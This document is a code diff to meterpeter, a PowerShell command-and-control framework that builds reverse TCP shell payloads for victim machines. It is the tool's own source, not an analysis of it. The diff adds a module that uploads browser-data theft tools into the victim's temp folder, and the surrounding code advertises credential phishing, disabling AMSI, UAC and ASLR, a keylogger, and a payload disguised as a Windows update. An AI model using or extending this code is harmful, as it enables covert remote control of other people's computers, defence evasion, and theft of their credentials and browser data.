@@ -1,40 +1,45 @@
 <#
 .SYNOPSIS
-  Starts a listener Server on a Windows attacker machine and generate oneline reverse shell payloads for CMD or PS
+  Starts a listener Server on a Windows|Linux attacker machine and generate oneline reverse shell payloads (PS)
 
   Author: @ZHacker13 &('r00t-3xp10it')
   Required Dependencies: None
   Optional Dependencies: Python3 (windows)|Apache2 (Linux)
-  PS Script Dev Version: v2.10
+  PS Script Dev Version: v2.10.6
 
 .DESCRIPTION
-   ReverseTCPShell - Framework. This PS1 starts a listener Server on a Windows attacker machine and generate oneline revshell
-   payloads for CMD and PS to be executed on the victim machine. You can use the generated oneline revshell payload also via
-   netcat on linux. (in this case you will lose the C2 functionalities like screenshot, upload and download files). If this
-   framework is executed using venom v1.0.16 framework {amsi evasion nº4} then linux users will not lost C2 functionalities
-   and the target connection terminal window will be executed hidden with the help of dropper.bat script.
+   This PS1 starts a listener Server on a Windows|Linux attacker machine and generates oneline
+   reverse tcp shell payloads (In PowerShell) to be executed on the victim machine. You can also
+   recive the remote connection via netcat. (In this case you will lose the C2 functionalities
+   like: upload|download files, screenshot, keylogger, post-exploit, Advanced Information, etc)
+
+.NOTES
+   meterpeter server creates one PS script (payload) and one dropper.bat (Launcher) then compress (zip)
+   the dropper and copy it to apache2 (On Linux) or Python3 http.server (On Windows) working directory,
+   then creates one URL (dropper.zip) for attacker to be abble to deliver the payload under LAN networks.
 
 .EXAMPLE
-   PS C:\> Get-Help ./meterpeter.ps1
+   PS C:\> Get-Help ./meterpeter.ps1 -full
+   Access This cmdlet Comment_Based_Help
 
 .EXAMPLE
    PS C:\> ./meterpeter.ps1
+   Execute meterpeter C2 Server
  
 .INPUTS
    None. You cannot pipe objects to meterpeter.ps1
 
 .OUTPUTS
-   Saves Update-KB4524147.ps1 to meterpeter working directory.
+   Saves Update-KB4524147.ps1 (reverse tcp shell) to meterpeter working directory.
 
- .LINK 
+ .LINK
+    https://github.com/r00t-3xp10it/meterpeter
     https://github.com/ZHacker13/ReverseTCPShell
-    https://www.youtube.com/watch?v=hiYyXv4RdD8
- 
 #>
 
 
 ## Meterpeter Develop version
-$dev_Version = "2.10.5";
+$dev_Version = "2.10.6";
 
 function Character_Obfuscation($String)
 {
@@ -856,7 +861,8 @@ While($Client.Connected)
       write-host "   GoogleX   Open Google Sphere(prank)       Open Remote Browser in google sphere";
       write-host "   LockPC    Lock Remote WorkStation         Lock Remote workstation (rundll32)";
       write-host "   SpeakPC   Make Remote-Host Speak          Input Frase for Remote-Host to Speak";
-      write-host "   CredPhi   Promp User for logon creds      Client:User|Admin - Privs Required";
+      write-host "   Browser   Enumerate Browsers Info         Client:User  - Privileges Required";
+      write-host "   CredPhi   Promp for logon creds           Client:User|Admin - Privs Required";
       write-host "   AMSIset   Turn On/Off AMSI (reg)          Client:User|Admin - Privs Required";
       write-host "   UACSet    Turn On/Off remote UAC          Client:Admin - Privileges Required";
       write-host "   ASLRSet   Turn On/Off remote ASLR         Client:Admin - Privileges Required";
@@ -1254,6 +1260,45 @@ While($Client.Connected)
           write-host "`n";
           $MYSpeak = "Next time dont forget to input the text   ok";
           $Command = "`$My_Line = `"$MYSpeak`";Add-Type -AssemblyName System.speech;`$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;`$speak.Volume = 85;`$speak.Rate = -2;`$speak.Speak(`$My_Line);echo `"   [OK] Speak Frase: '$MYSpeak' Remotely ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+        }
+      }
+      If($choise -eq "Browser" -or $choice -eq "browser")
+      {
+        write-host " Uploading files to: $Remote_Host \\ `$env:tmp" -ForegroundColor Blue -BackgroundColor White
+        write-host "`n   Remark" -ForegroundColor Yellow;
+        write-host "   ------";
+        write-host "   This module will upload GetBrowsers.ps1 and mozlz4-win32.exe";
+        write-host "   to target `$env:tmp trusted location, were attacker can then";
+        write-host "   execute them using :meterpeter> prompt to leak browsers info.";
+
+        $name = "GetBrowsers.ps1"
+        $File = "$Bin$name"
+       If(([System.IO.File]::Exists("$File")))
+        {
+          ## Write Local script (GetBrowsers.ps1) to Remote-Host $env:tmp
+          $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+          $FileBytes = "($FileBytes)";
+          $File = $File.Split('\')[-1];
+          $File = $File.Split('/')[-1];
+          ## Write Local (mozlz4-win32.exe) to Remote-Host $env:tmp
+          $name2 = "mozlz4-win32.exe";
+          $File2 = "$Bin$name2"
+          $FileBytes2 = [io.file]::ReadAllBytes("$File2") -join ',';
+          $FileBytes2 = "($FileBytes2)";
+          $File2 = $File2.Split('\')[-1];
+          $File2 = $File2.Split('/')[-1];
+          ## Uploading Files to remore host $env:tmp trusted location
+          $Command = "`$1=`"`$env:tmp\$File`";`$2=$FileBytes;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};`$3=`"`$env:tmp\$File2`";`$4=$FileBytes2;If(!([System.IO.File]::Exists(`"`$3`"))){[System.IO.File]::WriteAllBytes(`"`$3`",`$4);`"`$3`"}"
+          $Upload = $True;
+          $Tripflop = "True";
+        }else{
+          ## Local File { GetBrowsers.ps1 } not found .
+          Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
+          Write-Host "   ------     ----------";
+          Write-Host "   Not Found  $File" -ForeGroundColor red;
+          $File = $Null;
+          $Command = $Null;
+          $Upload = $False; 
         }
       }
       If($choise -eq "CredPhi" -or $choise -eq "Creds")
@@ -1877,9 +1922,18 @@ While($Client.Connected)
             $Cam_set = "False";
           }else{
             $OutPut = $OutPut -replace "`n","";
+            If($OutPut -match "GetBrowsers.ps1"){
+                $sanitize = $OutPut -replace 'GetBrowsers.ps1','GetBrowsers.ps1 '
+                $OutPut = $sanitize.split(' ')[0] # Get only the 1º upload path
+            }
             Write-Host "`n`n   Status   Remote Path" -ForeGroundColor green;
             Write-Host "   ------   -----------";
             Write-Host "   saved    $OutPut";
+          }
+          If($Tripflop -eq "True")
+          {
+            Write-Host "   execute  :meterpeter> Get-Help ./GetBrowsers.ps1 -full" -ForeGroundColor Yellow;
+            $Tripflop = "False";
           }
           If($Flipflop -eq "True")
           {
